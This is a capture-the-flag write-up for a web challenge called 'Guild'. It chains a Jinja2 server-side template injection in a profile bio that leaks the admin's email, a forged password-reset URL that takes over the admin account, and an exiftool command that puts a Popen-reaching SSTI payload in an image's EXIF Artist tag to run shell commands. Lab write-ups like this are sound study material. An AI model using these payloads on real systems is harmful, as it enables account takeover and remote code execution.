# Guild (<font color=lightgreen>Easy</font>)


## Description


## Tool Used
- Web Browser
- exiftool
- SHA-256

## Skill Learned
- Server-Side Template Injection (SSTI)

## Steps
1. Register and Log In
2. Exploit Server-Side Template Injection (SSTI) in profile. In the bio field, input:
    ```
      {{ User.query.filter(User.username=="admin").first().email }}
    ```
3. After saving and navigating to profile, the Admin's Email is displayed in the bio section
4. With the admin's email obtained, go to the Forgot Password page. Submit the admin's email address.
5. Construct the password reset URL:
    ```
      /changepasswd/<SHA256_HASH>
    ```
    Navigate to this URL to access the password reset page.
6. On the password reset page, set a new password for the admin account.
7. The /verify route used by admin opens the uploaded verification image, checks for an EXIF tag called Artist, and renders its value in a render_template_string() call.
    ```
    if "Artist" in exif_table.keys():
    sec_code = exif_table["Artist"]
    ...
    return render_template_string("Verified! {}".format(sec_code))
    ```
    We can  inject a server-side template injection (SSTI) payload into the Artist field of the image's EXIF metadata.
8. Use exiftool to inject an SSTI payload into an image file:
    ```
    exiftool -Artist="{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__ == 'Popen' %}{{ i(['cat','flag.txt'], -1, None, None, -1).communicate()[0] }}{% endif %}{% endfor %}" photo.jpg
    ```
9. Log in with a non-admin account and modified image
10. Log in with admin account with the changed password and verify uploaded image. SSTI payload will be executed and flag is obtained.




